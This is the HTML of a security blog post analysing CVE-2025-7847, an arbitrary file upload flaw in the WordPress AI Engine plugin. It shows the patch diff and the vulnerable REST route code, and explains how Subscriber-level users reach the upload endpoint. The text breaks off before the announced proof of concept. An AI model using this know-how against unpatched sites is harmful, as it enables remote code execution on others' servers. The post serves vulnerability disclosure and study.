<!DOCTYPE html>
<html itemscope itemtype="http://schema.org/WebPage" lang="en">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
    <meta name="robots" content="noodp" />
    <title>CVE-2025-7847 Analysis &amp; POC - Bui Van Y</title><meta name="author" content="Bui Van Y">
<meta name="description" content="Security Vulnerability in WordPress AI Engine Plugin."><meta name="keywords" content='analyst, plugin, arbitrary file upload'>
  <meta itemprop="name" content="CVE-2025-7847 Analysis & POC">
  <meta itemprop="description" content="Security Vulnerability in WordPress AI Engine Plugin.">
  <meta itemprop="datePublished" content="2025-11-13T19:00:00+07:00">
  <meta itemprop="dateModified" content="2025-11-25T21:12:53+07:00">
  <meta itemprop="wordCount" content="2365">
  <meta itemprop="image" content="http://localhost:1313/posts/2025-11-13-cve-2025-7847/app.png">
  <meta itemprop="keywords" content="Analyst,Plugin,Arbitrary File Upload"><meta property="og:url" content="http://localhost:1313/posts/2025-11-13-cve-2025-7847/">
  <meta property="og:site_name" content="Bui Van Y">
  <meta property="og:title" content="CVE-2025-7847 Analysis & POC">
  <meta property="og:description" content="Security Vulnerability in WordPress AI Engine Plugin.">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2025-11-13T19:00:00+07:00">
    <meta property="article:modified_time" content="2025-11-25T21:12:53+07:00">
    <meta property="article:tag" content="Analyst">
    <meta property="article:tag" content="Plugin">
    <meta property="article:tag" content="Arbitrary File Upload">
    <meta property="og:image" content="http://localhost:1313/posts/2025-11-13-cve-2025-7847/app.png">

  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:image" content="http://localhost:1313/posts/2025-11-13-cve-2025-7847/app.png">
  <meta name="twitter:title" content="CVE-2025-7847 Analysis & POC">
  <meta name="twitter:description" content="Security Vulnerability in WordPress AI Engine Plugin.">
<meta name="application-name" content="Bui Van Y">
<meta name="apple-mobile-web-app-title" content="Bui Van Y"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/images/svg-spinners--wind-toy.svg"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="http://localhost:1313/posts/2025-11-13-cve-2025-7847/" title="CVE-2025-7847 Analysis &amp; POC - Bui Van Y" /><link rel="prev" type="text/html" href="http://localhost:1313/posts/2025-11-13-wordpress-vulnerability-sink/" title="WordPress Vulnerability Sinks" /><link rel="next" type="text/html" href="http://localhost:1313/posts/2025-11-14-cve-2025-9083/" title="CVE-2025-9083 Analysis &amp; POC" /><link rel="alternate" type="text/markdown" href="http://localhost:1313/posts/2025-11-13-cve-2025-7847/index.md" title="CVE-2025-7847 Analysis & POC - Bui Van Y"><link rel="stylesheet" href="/css/config.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
  {
    "@context": "http://schema.org",
    "@type": "BlogPosting",
    "headline": "CVE-2025-7847 Analysis \u0026 POC",
    "inLanguage": "en",
    "mainEntityOfPage": {
      "@type": "WebPage",
      "@id": "http:\/\/localhost:1313\/posts\/2025-11-13-cve-2025-7847\/"
    },"image": ["http:\/\/localhost:1313\/images\/avatar.png"],"genre": "posts","keywords": "analyst, plugin, arbitrary file upload","wordcount":  2365 ,
    "url": "http:\/\/localhost:1313\/posts\/2025-11-13-cve-2025-7847\/","datePublished": "2025-11-13T19:00:00+07:00","dateModified": "2025-11-25T21:12:53+07:00","publisher": {
      "@type": "Organization",
      "name": "/images/avatar.png","logo": "http:\/\/localhost:1313\/images\/avatar.png"},"author": {
        "@type": "Person",
        "name": "Bui Van Y"
      },"description": "Security Vulnerability in WordPress AI Engine Plugin."
  }
  </script><script src="/js/head/color-scheme.min.js"></script></head>
  <body data-instant-intensity="viewport" data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
  <div class="header-wrapper">
    <div class="header-title">
      <a href="/" title="Bui Van Y"><img class="logo" src='/images/svg-spinners--wind-toy.svg' alt="Bui Van Y" height="32" width="32"><span class="header-title-text">Bui Van Y</span></a><span class="typeit header-subtitle"><template>w41bu1</template></span></div>
    <nav>
      <ul class="menu"><li class="menu-item">
              <a class="menu-link" href="/posts/"><i class="fa-solid fa-pencil fa-beat fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
              <a class="menu-link" href="/categories/"><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
              <a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
            <input type="text" placeholder="Search titles or contents ..." id="search-input-desktop">
            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
            </a>
            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
            </a>
            <span class="search-button search-loading" id="search-loading-desktop">
              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
            </span>
          </li><li class="menu-item theme-switch" role="button" aria-label="Switch Theme" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></li><li class="menu-item language-switch">
            <span role="button" aria-label="Select Language" title="Select Language"><i class="fa-solid fa-language fa-fw" aria-hidden="true"></i></span>
            <ul class="sub-menu"><li class="menu-item"><span class="text-secondary" title="English">English</span></li><li class="menu-item"><a href="/vi/posts/2025-11-13-cve-2025-7847/" class="menu-link" title="Vietnamese">Vietnamese</a></li></ul>
          </li></ul>
    </nav>
  </div>
</header><header class="mobile animate__faster" id="header-mobile">
  <div class="header-container">
    <div class="header-wrapper">
      <div class="header-title">
        <a href="/" title="Bui Van Y"><img class="logo" src='/images/svg-spinners--wind-toy.svg' alt="Bui Van Y" height="26" width="26"><span class="header-title-text">Bui Van Y</span></a><span class="typeit header-subtitle"><template>w41bu1</template></span></div>
      <div class="theme-switch" role="button" aria-label="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></div>
      <div class="menu-toggle" id="menu-toggle-mobile" role="button" aria-labelledby="menu-mobile">
        <span></span><span></span><span></span>
      </div>
    </div>
    <nav>
      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
            <div class="search mobile" id="search-mobile">
              <input type="text" placeholder="Search titles or contents ..." id="search-input-mobile">
              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
              </a>
              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
              </a>
              <span class="search-button search-loading" id="search-loading-mobile">
                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
              </span>
            </div>
            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
              Cancel
            </a>
          </li><li class="menu-item"><a class="menu-link" href="/posts/"><i class="fa-solid fa-pencil fa-beat fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item"><a class="menu-link" href="/categories/"><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item"><a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item menu-system"><span class="menu-system-item language-switch">
              <span role="button" aria-label="Select Language" title="Select Language">English<i class="dropdown-icon fa-solid fa-chevron-down" aria-hidden="true"></i></span>
              <select id="language-select" class="language-select" onchange="location = this.value;"><option value="/posts/2025-11-13-cve-2025-7847/" selected disabled>English</option><option value="/vi/posts/2025-11-13-cve-2025-7847/">Vietnamese</option></select>
            </span></li>
      </ul>
    </nav>
  </div>
</header><div class="search-dropdown desktop">
    <div id="search-dropdown-desktop"></div>
  </div>
  <div class="search-dropdown mobile">
    <div id="search-dropdown-mobile"></div>
  </div><main class="fi-container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"><div class="details related-details open">
      <div class="details-summary related-summary">
        <i class="fa-solid fa-fire fa-fade text-danger fa-fw" aria-hidden="true"></i>
        <span class="related-title">Related Content</span><i class="details-icon fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></div>
      <div class="details-content related-content">
        <ul class="related-list"><li class="related-item">
              <a href="/posts/2025-11-12-cve-2025-32202/" title="CVE-2025-32202 Analysis &amp; POC">CVE-2025-32202 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/posts/2025-11-11-cve-2025-47637/" title="CVE-2025-47637 Analysis &amp; POC">CVE-2025-47637 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/posts/2025-11-10-cve-2023-48777/" title="CVE-2023-48777 Analysis &amp; POC">CVE-2023-48777 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/posts/2025-11-09-cve-2025-1128/" title="CVE-2025-1128 Analysis &amp; POC">CVE-2025-1128 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/posts/2025-11-27-cve-2025-13035/" title="CVE-2025-13035 Analysis &amp; POC">CVE-2025-13035 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/posts/2025-11-26-cve-2025-26763/" title="CVE-2025-26763 Analysis &amp; POC">CVE-2025-26763 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/posts/2025-11-25-cve-2025-3439/" title="CVE-2025-3439 Analysis &amp; POC">CVE-2025-3439 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/posts/2025-11-24-cve-2025-48134/" title="CVE-2025-48134 Analysis &amp; POC">CVE-2025-48134 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/posts/2025-11-23-cve-2025-30773/" title="CVE-2025-30773 Analysis &amp; POC">CVE-2025-30773 Analysis &amp; POC</a></li><li class="related-item">
              <a href="/posts/2025-11-22-cve-2025-9501/" title="CVE-2025-9501 Analysis &amp; POC">CVE-2025-9501 Analysis &amp; POC</a></li></ul>
      </div>
    </div></aside>

  <article class="page single">
    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>CVE-2025-7847 Analysis &amp; POC</span>
      </h1></div><div class="post-meta">
      <div class="post-meta-line"><span class="post-author"><a href="github.com/w41bu1" title="Author" rel=" author" class="author"><img class="avatar" src='/images/avatar.png' alt="Bui Van Y" height="16" width="16">&nbsp;Bui Van Y</a></span><span class="post-included-in">&nbsp;included in <a href="/categories/cve-analysis/" class="post-category" title="Category - CVE Analysis"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> CVE Analysis</a></span></div><div class="post-meta-line"><span title="published on 2025-11-13 19:00:00"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2025-11-13">2025-11-13</time></span>&nbsp;<span title="Updated on 2025-11-25 21:12:53"><i class="fa-regular fa-calendar-check fa-fw me-1" aria-hidden="true"></i><time datetime="2025-11-25">2025-11-25</time></span>&nbsp;<span title="2365 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 2400 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>12 minutes</span>&nbsp;</div>
    </div><div class="featured-image"><img src='/posts/2025-11-13-cve-2025-7847/app.png' alt="/posts/2025-11-13-cve-2025-7847/app.png"></div><div class="details toc" id="toc-static" data-kept="false">
        <div class="details-summary toc-title">
          <span>Contents</span>
          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
        </div>
        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#cve--basic-info">CVE &amp; Basic Info</a></li>
    <li><a href="#requirements">Requirements</a></li>
    <li><a href="#cause">Cause</a></li>
    <li><a href="#code-analysis">Code Analysis</a></li>
    <li><a href="#flow">Flow</a></li>
    <li><a href="#proof-of-concept-poc">Proof of Concept (PoC)</a></li>
  </ul>

  <ul>
    <li><a href="#references">References</a></li>
  </ul>
</nav></div>
      </div><div class="content" id="content"><h2 class="heading-element" id="cve--basic-info"><span>CVE &amp; Basic Info</span>
  <a href="#cve--basic-info" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>The <strong>AI Engine</strong> plugin for <strong>WordPress</strong> contains an <strong>arbitrary file upload</strong> vulnerability due to missing <strong>file type validation</strong> in the <code>rest_simpleFileUpload()</code> function in versions <strong>2.9.3</strong> and <strong>2.9.4</strong>.
This allows <strong>authenticated attackers</strong> (attackers with authentication), with <strong>Subscriber-level</strong> privileges or higher, to <strong>upload arbitrary files</strong> to the affected website&rsquo;s <strong>server</strong> when the <strong>REST API</strong> is enabled, which can lead to <strong>remote code execution (RCE)</strong>.</p>
<ul>
<li><strong>CVE ID</strong>: <a href="https://www.cve.org/CVERecord?id=CVE-2025-7847"target="_blank" rel="external nofollow noopener noreferrer">CVE-2025-7847</a></li>
<li><strong>Vulnerability Type</strong>: Arbitrary File Upload</li>
<li><strong>Affected Versions</strong>: 2.9.3-2.9.4</li>
<li><strong>Patched Versions</strong>: 2.9.5</li>
<li><strong>CVSS severity</strong>: High (9.9)</li>
<li><strong>Required Privilege</strong>: Subscriber</li>
<li><strong>Product</strong>: <a href="https://wordpress.org/plugins/ai-engine/"target="_blank" rel="external nofollow noopener noreferrer">WordPress AI Engine Plugin</a></li>
</ul>
<h2 class="heading-element" id="requirements"><span>Requirements</span>
  <a href="#requirements" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><ul>
<li>
<p><strong>Local WordPress &amp; Debugging</strong></p>
<ul>
<li><a href="https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/"target="_blank" rel="external nofollow noopener noreferrer">Virtual Machine</a></li>
<li><a href="https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/"target="_blank" rel="external nofollow noopener noreferrer">Docker</a></li>
</ul>
</li>
<li>
<p><strong>Plugin Version</strong> - <strong>AI Engine</strong>:</p>
<ul>
<li><code>2.9.4</code> – <strong>vulnerable</strong></li>
<li><code>2.9.5</code> – <strong>patched</strong></li>
</ul>
</li>
<li>
<p><strong>Diff Tool (diff)</strong> → <a href="https://meldmerge.org/"target="_blank" rel="external nofollow noopener noreferrer"><strong>Meld</strong></a> or any diff tool.</p>
</li>
</ul>
<h2 class="heading-element" id="cause"><span>Cause</span>
  <a href="#cause" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>The vulnerability occurs because the upload handling function writes files directly (<code>copy()</code>, <code>file_put_contents()</code>) without <strong>checking file type or authenticating the user</strong>, allowing an attacker to <strong>upload arbitrary files (including <code>.php</code>)</strong> into the uploads directory and execute malicious code.</p>
<p><figure><a class="lightgallery" href="/posts/2025-11-13-cve-2025-7847/diff.png" title="Validate file type" data-thumbnail="/posts/2025-11-13-cve-2025-7847/diff.png" data-sub-html="<h2>Validate File Type</h2><p>Validate file type</p>"><img loading="lazy" src='/posts/2025-11-13-cve-2025-7847/diff.png' alt="Validate File Type" height="516" width="1819"></a><figcaption class="image-caption">Validate file type</figcaption>
  </figure></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// Validate filename extension for base64 uploads
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$validate</span> <span class="o">=</span> <span class="nx">wp_check_filetype</span><span class="p">(</span> <span class="nv">$filename</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span> <span class="nv">$validate</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="k">false</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">throw</span> <span class="k">new</span> <span class="nx">Exception</span><span class="p">(</span> <span class="s1">&#39;File type is not allowed.&#39;</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p>The patch added file type checks in the <code>simpleFileUpload</code> and <code>upload_file</code> functions using <code>wp_check_filetype()</code> to only allow uploads for valid formats based on WordPress&rsquo;s whitelist.</p>
<h2 class="heading-element" id="code-analysis"><span>Code Analysis</span>
  <a href="#code-analysis" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>The plugin registers several public APIs via the <code>rest_api_init()</code> function</p>
<div class="highlight" data-open="true" title="api.php"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="hl"><span class="lnt"> 3
</span></span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="hl"><span class="lnt"> 8
</span></span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="hl"><span class="lnt">12
</span></span><span class="lnt">13
</span><span class="hl"><span class="lnt">14
</span></span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">rest_api_init</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nv">$public_api</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">core</span><span class="o">-&gt;</span><span class="na">get_option</span><span class="p">(</span> <span class="s1">&#39;public_api&#39;</span> <span class="p">);</span>
</span></span><span class="line hl"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="nv">$public_api</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">bearer_token</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">core</span><span class="o">-&gt;</span><span class="na">get_option</span><span class="p">(</span> <span class="s1">&#39;public_api_bearer_token&#39;</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">bearer_token</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line hl"><span class="cl">    <span class="nx">add_filter</span><span class="p">(</span> <span class="s1">&#39;mwai_allow_public_api&#39;</span><span class="p">,</span> <span class="p">[</span> <span class="nv">$this</span><span class="p">,</span> <span class="s1">&#39;auth_via_bearer_token&#39;</span> <span class="p">],</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">3</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="nx">register_rest_route</span><span class="p">(</span> <span class="s1">&#39;mwai/v1&#39;</span><span class="p">,</span> <span class="s1">&#39;/simpleFileUpload&#39;</span><span class="p">,</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;methods&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;POST&#39;</span><span class="p">,</span>
</span></span><span class="line hl"><span class="cl">    <span class="s1">&#39;callback&#39;</span> <span class="o">=&gt;</span> <span class="p">[</span> <span class="nv">$this</span><span class="p">,</span> <span class="s1">&#39;rest_simpleFileUpload&#39;</span> <span class="p">],</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;permission_callback&#39;</span> <span class="o">=&gt;</span> <span class="k">function</span> <span class="p">(</span> <span class="nv">$request</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line hl"><span class="cl">      <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">core</span><span class="o">-&gt;</span><span class="na">can_access_public_api</span><span class="p">(</span> <span class="s1">&#39;simpleFileUpload&#39;</span><span class="p">,</span> <span class="nv">$request</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="p">]</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="o">...</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p>The function checks whether the <strong>Public API</strong> option is enabled. According to the plugin <a href="https://ai.thehiddendocs.com/public-rest-api/"target="_blank" rel="external nofollow noopener noreferrer">documentation</a>, this option is disabled by default:</p>
<blockquote>
<p>By default, the Public REST API is disabled completely. If you enable it, only authentified API requests will actually go through, otherwise they will be rejected. You can override this behavior in many ways and we will see a few examples. The Public REST API is also limited by the Limits set in AI Engine (either as Users or Guests, and System).</p>
</blockquote>
<p>You can enable it in the Admin Dashboard at <code>wp-admin/admin.php?page=mwai_settings&amp;nekoTab=settings</code></p>
<p><figure><a class="lightgallery" href="https://ai.thehiddendocs.com/wp-content/uploads/sites/2/2025/07/image-8.png" title="enable the REST API" data-thumbnail="https://ai.thehiddendocs.com/wp-content/uploads/sites/2/2025/07/image-8.png" data-sub-html="<h2>enable the REST API</h2><p>enable the REST API</p>"><img loading="lazy" src='https://ai.thehiddendocs.com/wp-content/uploads/sites/2/2025/07/image-8.png' alt="enable the REST API"></a><figcaption class="image-caption">enable the REST API</figcaption>
  </figure></p>
<p>According to the description, when this option is enabled, only <code>authenticated API requests</code> are accepted. There are two authentication methods:</p>
<ul>
<li><code>X-WP-Nonce</code>: Obtained via the JavaScript object <code>wpApiSettings</code> for logged-in users (Subscriber+)</li>
<li><code>Bearer Token</code>: Configured by the admin</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">bearer_token</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">core</span><span class="o">-&gt;</span><span class="na">get_option</span><span class="p">(</span> <span class="s1">&#39;public_api_bearer_token&#39;</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">bearer_token</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">add_filter</span><span class="p">(</span> <span class="s1">&#39;mwai_allow_public_api&#39;</span><span class="p">,</span> <span class="p">[</span> <span class="nv">$this</span><span class="p">,</span> <span class="s1">&#39;auth_via_bearer_token&#39;</span> <span class="p">],</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">3</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p>When a Bearer Token is set, the plugin <strong>registers a filter</strong> named <code>mwai_allow_public_api</code>,
with the <strong>callback</strong> being the method <code>auth_via_bearer_token</code>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">register_rest_route</span><span class="p">(</span> <span class="s1">&#39;mwai/v1&#39;</span><span class="p">,</span> <span class="s1">&#39;/simpleFileUpload&#39;</span><span class="p">,</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">  <span class="s1">&#39;methods&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;POST&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="s1">&#39;callback&#39;</span> <span class="o">=&gt;</span> <span class="p">[</span> <span class="nv">$this</span><span class="p">,</span> <span class="s1">&#39;rest_simpleFileUpload&#39;</span> <span class="p">],</span>
</span></span><span class="line"><span class="cl">  <span class="s1">&#39;permission_callback&#39;</span> <span class="o">=&gt;</span> <span class="k">function</span> <span class="p">(</span> <span class="nv">$request</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">core</span><span class="o">-&gt;</span><span class="na">can_access_public_api</span><span class="p">(</span> <span class="s1">&#39;simpleFileUpload&#39;</span><span class="p">,</span> <span class="nv">$request</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl"><span class="p">]</span> <span class="p">);</span></span></span></code></pre></td></tr></table>
</div>
</div><p>An API is registered with method POST:</p>
<ul>
